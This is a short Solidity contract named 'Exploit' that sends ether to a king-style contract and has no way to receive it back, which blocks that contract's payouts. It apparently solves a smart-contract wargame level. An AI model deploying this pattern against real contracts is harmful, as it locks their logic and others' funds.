  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;

  contract Exploit{

    constructor(address payable _kingAddress) payable {
        _kingAddress.call{value: msg.value}("");
    }

  }
